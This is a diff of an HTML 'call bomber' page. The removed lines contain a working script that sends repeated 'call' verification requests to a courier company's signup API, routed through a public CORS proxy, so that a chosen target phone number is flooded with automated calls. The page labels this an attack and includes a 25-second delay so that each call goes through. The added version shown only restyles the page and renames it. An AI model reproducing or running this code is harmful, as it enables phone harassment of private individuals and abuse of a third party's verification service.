@@ -3,88 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Call Bomber Pro - Fixed</title>
+    <title>HEX CALL BOM</title>
     <style>
-        body { margin: 0; padding: 0; background: #000; color: #ff0000; font-family: monospace; overflow: hidden; }
+        body { margin: 0; padding: 0; background: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
         canvas { position: absolute; top: 0; left: 0; z-index: -1; }
-        .container { text-align: center; margin-top: 15%; background: rgba(0,0,0,0.8); padding: 20px; border: 1px solid #ff0000; display: inline-block; position: relative; left: 50%; transform: translateX(-50%); box-shadow: 0 0 15px #ff0000; }
-        input { background: #000; color: #ff0000; border: 1px solid #ff0000; padding: 10px; margin: 5px; width: 220px; text-align: center; outline: none; }
-        button { background: #ff0000; color: #000; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; margin-top: 10px; transition: 0.3s; }
-        button:hover { background: #fff; color: #ff0000; }
-        #display { margin-top: 20px; font-size: 1.2em; text-shadow: 0 0 5px #ff0000; }
+        .container { text-align: center; margin-top: 10%; background: rgba(0,0,0,0.85); padding: 30px; border: 2px solid #ff0000; display: inline-block; position: relative; left: 50%; transform: translateX(-50%); box-shadow: 0 0 20px #ff0000; border-radius: 10px; }
+        input { background: #111; color: #ff0000; border: 1px solid #ff0000; padding: 12px; margin: 8px; width: 250px; text-align: center; font-size: 16px; outline: none; }
+        button { background: #ff0000; color: #000; border: none; padding: 15px 30px; cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 18px; transition: 0.4s; text-transform: uppercase; }
+        button:hover { background: #fff; color: #ff0000; box-shadow: 0 0 10px #fff; }
+        #display { margin-top: 25px; font-size: 1.3em; font-weight: bold; text-shadow: 0 0 8px #ff0000; min-height: 30px; }
+        h1 { letter-spacing: 5px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div class="container">
-        <h1>CALL BOMBER BY HEX</h1>
-        <input type="text" id="target" placeholder="Target Number (e.g. 017...)"><br>
-        <input type="number" id="count" placeholder="Call Amount (Max 10)"><br>
-        <button onclick="startProcess()">START ATTACK</button>
-        <div id="display">System Ready</div>
+        <h1>HEX CALL BOM</h1>
+        <input type="text" id="target" placeholder="Enter Target Number"><br>
+        <input type="number" id="count" placeholder="Number of Calls (Max 5)"><br>
+        <button onclick="startProcess()">Launch Attack</button>
+        <div id="display">SYSTEM STANDBY</div>
     </div>
 
     <script>
         async function startProcess() {
             const target = document.getElementById('target').value;
             const count = parseInt(document.getElementById('count').value);
-            const display = document.getElementById('display');
-
-            if(!target || !count) { display.innerText = "Error: Input Missing!"; return; }
-            if(count > 10) { display.innerText = "Limit: Max 10 calls!"; return; }
-
-            display.innerText = "Initiating Attack...";
-
-            // CORS সমস্যার সমাধানের জন্য প্রক্সি ব্যবহার করা হয়েছে
-            const proxy = "https://corsproxy.io/?"; 
-            const apiUrl = "https://api.redx.com.bd/api/v1/user/signup";
-
-            for (let i = 1; i <= count; i++) {
-                try {
-                    // প্রক্সি দিয়ে রিকোয়েস্ট পাঠানো হচ্ছে যাতে CORS এরর না আসে
-                    const response = await fetch(proxy + encodeURIComponent(apiUrl), {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            "phone": target, 
-                            "type": "call",
-                            "resend": true 
-                        })
-                    });
-
-                    if(response.ok) {
-                        display.innerText = "Call Request Sent: " + i;
-                    } else {
-                        display.innerText = "Server Busy, Retrying...";
-                    }
-                    
-                    // কল আসার জন্য ২৫ সেকেন্ড ডিলে (Delay)
-                    await new Promise(res => setTimeout(res, 25000)); 
-                } catch (e) {
-                    display.innerText = "Connection Error! Retrying...";
-                    console.log("Error skipped...");
-                }
-            }
-            display.innerText = "Attack Completed!";
-        }
-
-        // Matrix Background Animation (আপনার মূল কোড)
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "01011001"; const fontSize = 16;
-        const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
-        function draw() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#ff0000"; ctx.font = fontSize + "px monospace";
-            for (let i = 0; i < drops.length; i++) {
-                const text = letters[Math.floor(Math.random() * letters.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        setInterval(draw, 33);
-    </script>
-</body>
-</html>
